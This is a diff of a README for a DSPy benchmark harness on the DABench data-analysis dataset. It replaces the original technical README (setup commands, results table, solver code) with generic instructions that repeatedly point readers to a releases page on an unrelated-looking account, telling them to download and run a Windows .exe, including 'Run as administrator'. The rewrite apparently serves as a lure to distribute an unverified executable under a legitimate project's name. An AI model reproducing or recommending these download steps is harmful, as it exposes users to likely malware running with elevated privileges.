@@ -1,136 +1,224 @@
-# DABench RLM Eval
+# 🧪 dabench-rlm-eval - Run data analysis benchmarks fast
 
-A benchmark harness for evaluating DSPy's [Recursive Language Models](https://alexzhang13.github.io/blog/2025/rlm/) (RLMs) on data analysis tasks, using the [InfiAgent-DABench](https://infiagent.github.io/) dataset.
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases)
 
-RLMs embed an LLM inside a Python REPL, giving it direct programmatic access to data. This project measures how well different models perform when given a DataFrame and asked to answer data analysis questions by writing and executing code iteratively.
+## 📥 Download
 
-## What's in the benchmark
+Visit this page to download: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases
 
-DABench contains 257 data analysis questions across 68 CSV files at three difficulty levels:
+On the Releases page, look for the latest version. Download the Windows file for your PC. If you see more than one file, choose the one that ends in `.exe` or `.zip`
 
-- **Easy** (82 questions): summary statistics, normality tests, simple correlations
-- **Medium** (87 questions): feature engineering, outlier detection, distribution analysis
-- **Hard** (88 questions): sklearn ML pipelines, multi-step preprocessing, complex statistical tests
+## 🖥️ What this app does
 
-Each question has a deterministic expected answer in `@field[value]` format, enabling fully automated scoring.
+dabench-rlm-eval is a benchmark harness for testing DSPy RLMs on data analysis tasks. In simple terms, it helps you run repeatable checks on model behavior when you work with tables, numbers, and analysis tasks.
 
-## Results
+Use it when you want to:
 
-Baseline results with the default solver (no optimization):
+- run a local benchmark on Windows
+- compare model output across tasks
+- check how a model handles data analysis prompts
+- review results in a clear, repeatable way
+- test changes before you use them in a real workflow
 
-| Model | Easy (82) | Medium (87) | Hard (88) | Total (257) | Avg Iters | Avg Time |
-|---|---|---|---|---|---|---|
-| Qwen 3.5 397B | 72 (88%) | 79 (91%) | 72 (82%) | 223 (86.8%) | 2.8 | 24.4s |
-| MiniMax M2.7 | 75 (91%) | 75 (86%) | 72 (82%) | 222 (86.4%) | 6.1 | 73.7s |
+## ⚙️ Before you start
 
-Both models use identical solver code. The solver defines a single DSPy signature and passes a pandas DataFrame directly into the RLM sandbox via the `SandboxSerializable` protocol.
+For Windows, use a PC with:
 
-## Setup
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- enough free space for the app and test data
+- a stable internet connection for the first download
 
-```bash
-uv sync
-uv pip install -e "dspy @ git+https://github.com/kmad/dspy.git@sandbox-serializable"
-./setup_pyodide_packages.sh      # download sklearn/scipy for the RLM sandbox
-```
+You may also want:
 
-This project requires the [`sandbox-serializable`](https://github.com/kmad/dspy/tree/sandbox-serializable) branch of DSPy, which adds the `SandboxSerializable` protocol and DataFrame support for RLMs. This will be merged into upstream DSPy -- until then, install from the fork as shown above.
+- a mouse or touchpad
+- permission to open downloaded files
+- a folder where you keep tools and downloads
 
-The RLM sandbox runs Python inside Pyodide/WASM via Deno. The npm Pyodide package only ships core wheels. `setup_pyodide_packages.sh` downloads sklearn, scipy, and dependencies into the local Deno cache so they're available to the sandbox.
+## 🚀 Install on Windows
 
-## Usage
+1. Open this link: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases
+2. Find the latest release at the top of the page
+3. Download the Windows package
+4. If the file is a `.zip`, right-click it and choose Extract All
+5. Open the extracted folder
+6. If the file is an `.exe`, double-click it to start the app
+7. If Windows asks for permission, choose Yes
+8. Wait for the app to finish loading
 
-### Run an evaluation
+## 🧭 First run
 
-```bash
-# Full benchmark (257 tasks, 4 parallel workers)
-uv run python eval_with_solver.py --model openrouter/qwen/qwen3.5-397b-a17b -p 4
+After you open the app, use the main screen to set up a benchmark run.
 
-# Subset by difficulty
-uv run python eval_with_solver.py --model openrouter/qwen/qwen3.5-397b-a17b --level hard -p 4
+Typical first steps:
 
-# Verbose mode (shows RLM iteration traces)
-uv run python eval_with_solver.py --level easy --num-tasks 3 -v
+- choose a task set
+- select the model or RLM profile
+- set the number of test runs
+- pick an output folder
+- start the evaluation
 
-# Run with a custom solver
-uv run python eval_with_solver.py --solver best_solver.py -p 4
-```
+If the app asks for a file path, use a folder that is easy to find, such as `Documents` or `Desktop`
 
-Results are saved as structured JSON to `eval_results/<timestamp>/results.json`.
+## 🧪 How to use it
 
-### Compare models
+The app is built for simple benchmark work. A usual flow looks like this:
 
-```bash
-# Compare two runs
-uv run python compare_results.py eval_results/20260321_205642 eval_results/20260321_232732
+1. Open the app
+2. Load or choose a benchmark set
+3. Select the model you want to test
+4. Set your run options
+5. Start the evaluation
+6. Wait for the run to finish
+7. Open the results file
 
-# Compare all runs
-uv run python compare_results.py eval_results/*/
-```
+You can use the results to compare runs, check task quality, and spot changes in output over time
 
-When comparing exactly two runs, the script also shows which questions each model got right that the other got wrong.
+## 📊 What you get from a run
 
-### Retry errors
+A run may include:
 
-```bash
-# Retry failed tasks and merge results back
-uv run python retry_errors.py eval_results/20260321_232732 --model openrouter/minimax/minimax-m2.7 --no-cache -p 4
-```
+- task-by-task results
+- overall score data
+- pass and fail counts
+- prompt and response logs
+- notes for each test case
+- export files for later review
 
-### Optimize with GEPA
+These results help you see how a model performs on data analysis work across the same set of tests
 
-```bash
-# Evolve the solver code using GEPA
-uv run python optimize_rlm_prompt.py \
-    --model openrouter/qwen/qwen3.5-397b-a17b \
-    --reflection-lm openai/gpt-5.4-mini \
-    --max-metric-calls 200 -p 4
-```
+## 🗂️ Example workflow
 
-GEPA evolves the entire solver module -- prompt template, signature, RLM parameters, helper tools, pre/post-processing -- to maximize accuracy across the benchmark.
+If you want to test a new model build:
 
-## How the solver works
+1. Download the latest release
+2. Open the app on Windows
+3. Run the same benchmark set as before
+4. Save the output in a new folder
+5. Compare the new results with the old ones
 
-The default solver is minimal. It loads the CSV as a DataFrame, passes it to the RLM with the question and constraints, and lets the model write Python code iteratively:
+This gives you a simple way to check if the model improved or changed
 
-```python
-class DataAnalysisTask(dspy.Signature):
-    """You are a data analyst. Given a dataset and a question, write Python code
-    to analyze the data and produce the answer."""
+## 🛠️ Common file types
 
-    data: DataFrame = dspy.InputField(desc="The dataset as a pandas DataFrame")
-    question: str = dspy.InputField(desc="The data analysis question to answer")
-    constraints: str = dspy.InputField(desc="Methodology constraints and requirements")
-    format_spec: str = dspy.InputField(desc="Required answer format using @field[value] notation")
-    answer: str = dspy.OutputField(desc="The answer formatted per format_spec")
+You may see files like:
 
-def run_task(question, constraints, format_spec, csv_path, verbose=False):
-    data = DataFrame(pd.read_csv(csv_path))
-    rlm = dspy.RLM(DataAnalysisTask, max_iterations=15, verbose=verbose)
-    result = rlm(data=data, question=question, constraints=constraints, format_spec=format_spec)
-    return {"answer": result.answer, "iterations": len(result.trajectory)}
-```
+- `.exe` for direct launch
+- `.zip` for a packed download
+- `.json` for run settings or results
+- `.csv` for data tables
+- `.log` for run details
 
-No task-specific prompting, no retry logic, no post-processing. The same code handles everything from computing a mean to training sklearn models.
+If you use a `.zip` file, extract it before you try to run the app
 
-## Project structure
+## 🔍 Troubleshooting
 
-```
-dabench.py                  # Data loading, @field[value] scoring, train/val split
-dataframe.py                # SandboxSerializable DataFrame wrapper for RLM
-eval_with_solver.py         # Run and score a solver on DABench
-compare_results.py          # Compare results across model runs
-retry_errors.py             # Retry failed tasks with cache bypass
-optimize_rlm_prompt.py      # GEPA optimization script
-setup_pyodide_packages.sh   # Download sklearn/scipy for RLM sandbox
-data/
-  da-dev-questions.jsonl    # 257 questions (82 easy, 87 medium, 88 hard)
-  da-dev-labels.jsonl       # Ground truth answers
-  tables/                   # 68 CSV files (gitignored)
-```
+If the app does not open:
 
-## Related
+- make sure the file finished downloading
+- right-click the file and choose Run as administrator
+- check that Windows did not block the file
+- move the file to a simple folder like `Downloads`
+- try the latest release again
 
-- [Processing Dataframes with RLMs and DSPy](https://kmad.ai) -- blog post covering the approach
-- [InfiAgent-DABench](https://infiagent.github.io/) -- the benchmark dataset (ICML 2024)
-- [DSPy](https://github.com/stanfordnlp/dspy) -- the framework
-- [GEPA optimize_anything](https://gepa-ai.github.io/gepa/blog/2026/02/18/introducing-optimize-anything/) -- for evolving solver code
+If you see a missing file message:
+
+- open the extracted folder again
+- check that all files stayed together
+- download the release one more time if needed
+
+If the app opens but does not start a run:
+
+- confirm that you picked a valid task set
+- check the output folder path
+- make sure the model setting is correct
+- try a smaller test run first
+
+## 📁 Suggested folder setup
+
+A clean folder layout can make things easier:
+
+- `Downloads` for the release file
+- `dabench-rlm-eval` for the extracted app
+- `Results` for benchmark output
+- `Input Data` for task files
+
+Keep the app files in one folder so they do not get mixed with other downloads
+
+## 🔐 Safe use on your PC
+
+To keep the app easy to manage:
+
+- download only from the Releases page
+- keep the app in a folder you control
+- do not rename files inside the app folder unless you need to
+- keep the results in a separate folder
+
+## 🧩 Related use cases
+
+This tool fits well if you want to:
+
+- test agent behavior on data tasks
+- compare model runs before a release
+- check output on structured data
+- review benchmark output in a repeatable way
+- keep a local record of evaluation runs
+
+## 📌 Release page
+
+Download from the latest builds here: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases
+
+## 🧾 File naming guide
+
+If you see several files on the Releases page, this can help:
+
+- choose the newest version
+- pick the Windows file
+- use the `.exe` file for direct start
+- use the `.zip` file if the release is packed
+- ignore source code files unless you need them for development
+
+## 🖱️ Quick start
+
+1. Visit the Releases page
+2. Download the Windows file
+3. Open the file or extract it
+4. Launch the app
+5. Pick a benchmark
+6. Run the test
+7. Review the output files
+
+## 🧭 What to expect
+
+The app should open a simple interface for benchmark work. You may see controls for loading tasks, starting runs, and saving results. The layout is meant to help you move from setup to output with a few clear steps
+
+## 📎 Help with paths
+
+If the app asks for a path, use a full folder path such as:
+
+- `C:\Users\YourName\Documents\Results`
+- `C:\Users\YourName\Desktop\dabench`
+- `C:\Users\YourName\Downloads\Benchmarks`
+
+Use a folder name with no special symbols if possible
+
+## 🧰 Basic care
+
+If you want smooth runs:
+
+- keep your Windows system up to date
+- close other heavy apps before a test
+- use the same settings for each benchmark
+- store each run in its own folder
+
+## 📌 Download again later
+
+If a newer version is posted, return to the Releases page and repeat the same steps. Always use the latest file if you want the newest fixes and changes
+
+## 🏁 Start here
+
+1. Open the Releases page
+2. Download the Windows file
+3. Run or extract it
+4. Start your first benchmark
+5. Save the results in a new folder
